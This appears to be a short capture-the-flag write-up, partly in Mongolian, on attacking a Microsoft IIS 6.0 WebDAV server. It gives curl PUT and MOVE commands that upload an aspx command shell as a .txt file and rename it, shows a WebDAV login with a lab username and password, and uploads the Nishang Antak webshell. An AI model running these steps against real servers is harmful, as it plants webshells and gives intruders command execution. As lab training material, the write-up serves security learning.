# Granny - Microsoft IIS 6.0 Webdav

aspx файлыг upload хийхдээ txt-ээр PUT хийгээд дараа нь MOVE-ээр aspx болгох:

```bash
curl -s -v -X PUT http://10.10.10.15/zatir.txt -d @cmdasp.aspx
```

txt to aspx:

```bash
curl -s -v -X MOVE http://10.10.10.15/zatir.txt -H "Destination:http://10.10.10.15/zetr0.aspx"
```

### Access WebDAV

```bash
cadaver http://192.168.247.122
Authentication required for 192.168.247.122 on server `192.168.247.122':
Username: fmcsorley
Password: CrabSharkJellyfish192
dav:/>
```

### Listing

```bash
dav:/> ls
Listing collection `/': succeeded.
Coll: aspnet_client 0 Nov 4 2020
iisstart.htm 703 Nov 4 2020
iisstart.png 99710 Nov 4 2020
index.aspx 1241 Nov 5 2020
```

### Put antak.aspx webshell

```bash
cp /usr/share/nishang/Antak-WebShell/antak.aspx

dav:/> put antak.aspx
Uploading antak.aspx to `/antak.aspx':
Progress: [=============================>] 100.0% of 10444 bytes succeeded.
```
